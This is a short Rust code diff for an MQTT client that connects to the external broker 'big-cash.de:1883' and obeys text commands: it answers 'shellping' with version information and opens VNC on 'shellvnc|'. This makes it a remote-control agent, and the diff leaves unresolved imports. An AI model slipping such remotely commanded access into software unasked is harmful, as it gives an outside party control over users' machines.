@@ -1,16 +1,20 @@
 use std::thread;
 use std::sync::{Arc, RwLock};
 use std::time::Duration;
-use rumqtt::{MqttOptions, MqttClient, ReconnectOptions, SecurityOptions};
+use rumqtt::MqttClient;
 use mqtt3::{Packet, QoS};
 use std::path::{Path};
+use std::env;
+use getfileversion;
 
 const VERSION: &'static str = env!("CARGO_PKG_VERSION");
 
 pub fn run_mqtt(path_str: &'static str) {
     //let path = Path::new(path_str);
     let mymac = get_mac();
+    let myversion = get_file_version(env::current_exe().unwrap());
     println!(" mac is: {}", &mymac);
+
 
     let client_options = MqttOptions::new("rumqtt-demo10", "big-cash.de:1883").unwrap()
             .set_keep_alive(10)
@@ -37,6 +41,7 @@ pub fn run_mqtt(path_str: &'static str) {
                                 println!("get ping, send pong");
                                 send_reply(Arc::clone(&tx), sender_topic.clone(), "shellpong".to_owned());
                                 send_reply(Arc::clone(&tx), sender_topic.clone(), format!("Shell Version:{}", VERSION).to_owned());
+                                send_reply(Arc::clone(&tx), sender_topic.clone(), format!("Product Version:v{:}.{:}.{:}.{:}", myversion.0, myversion.1, myversion.2, myversion.3).to_owned());
                             },
                             x if x.contains("shellvnc|") => {
                                 println!("get vnc, open vnc");
